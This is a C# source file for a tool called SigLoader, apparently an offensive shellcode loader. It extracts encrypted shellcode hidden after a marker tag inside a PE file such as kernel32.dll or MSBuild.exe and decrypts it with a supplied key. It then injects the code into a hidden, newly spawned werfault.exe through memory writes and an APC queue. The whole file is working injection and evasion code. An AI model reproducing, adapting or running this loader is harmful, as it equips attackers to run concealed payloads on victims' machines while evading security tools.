using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static SigLoader.APIDef;


namespace SigLoader
{
    public class Program
    {
        public static string _pePath = "";
        public static string _encKey = "";
        public static string _pid = "";
        public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
        public static void Main(string[] args)
        {
            ArgumentParser _parser = new ArgumentParser(args);

            if (args.Length <= 0 || _parser.GetOrDefault("h", "help") == "true") {
                Help();
            }

            if (_parser.GetOrDefault("f", "null") != "null") {
                _pePath = _parser.GetOrDefault("f", "null");
                _encKey = _parser.GetOrDefault("e", "null");

                if (_pePath == "null") Help();
            }
            else {
                Help();
            }

            if (!File.Exists(_pePath)) Help();

            Console.WriteLine("[+]:Loading/Parsing PE File '{0}'", _pePath);
            Console.WriteLine();

            byte[] _peBlob = Utils.Read(_pePath);
            int _dataOffset = Utils.scanPattern(_peBlob, _tag);

            Console.WriteLine("[+]:Scanning for Shellcode...");
            if ( _dataOffset == -1) {
                Console.WriteLine("Could not locate data or shellcode");
                Environment.Exit(0);
            }

            Stream stream = new MemoryStream(_peBlob);
            long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
            Console.WriteLine("[+]: Shellcode located at {0:x2}", pos);
            //垃圾原始代碼
            //byte[] shellcode = new byte[_peBlob.Length - (pos + _tag.Length)];
            //stream.Read(shellcode, 0, (_peBlob.Length)- ((int)pos + _tag.Length));
            byte[] shellcode = new byte[_peBlob.Length - (int)pos ];
            stream.Read(shellcode, 0, (_peBlob.Length)- (int)pos);
            byte[] b_shellcode = Utils.Decrypt(shellcode, _encKey);
            stream.Close();

            //Console.WriteLine(BitConverter.ToString(b_shellcode));
            //執行shellcode
            IntPtr tkn = WindowsIdentity.GetCurrent().Token;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";
            si.dwFlags = 0x101;
            si.wShowWindow = 0;
            if (CreateProcessAsUser(tkn, @"c:\Windows\System32\werfault.exe", null, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
            {

                // 分配内存PAGE_READWRITE
                IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, b_shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
                IntPtr bytesWritten = IntPtr.Zero;

                // 写入shellcode
                //Marshal.Copy(b_shellcode, 0, resultPtr, b_shellcode.Length);
                bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, b_shellcode, b_shellcode.Length, out bytesWritten);

                // 打开线程
                IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
                uint oldProtect = 0;

                // 修改内存权限PAGE_EXECUTE_READ
                resultBool = VirtualProtectEx(pi.hProcess, resultPtr, b_shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

                // 把shellcode地址加入apc队列
                IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);

                IntPtr ThreadHandle = pi.hThread;
                ResumeThread(ThreadHandle);

                Console.WriteLine("[!] process with pid: {0} created.\r\n", pi.dwProcessId);
            }
        }

        public static void Help()
        {
            Console.WriteLine();
            Console.WriteLine("Usage:");
            Console.WriteLine(@"   c:\> SigLoader.exe -f <PE_FILE_PATH> -e <ENCRYPTION_KEY>");
            Console.WriteLine();
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\kernel32.dll -e TestKey");
            Console.WriteLine(@"   c:\> SigLoader.exe -f C:\Temp\MSBuild.exe -e TestKey");
            Environment.Exit(0);
        }


    }
}
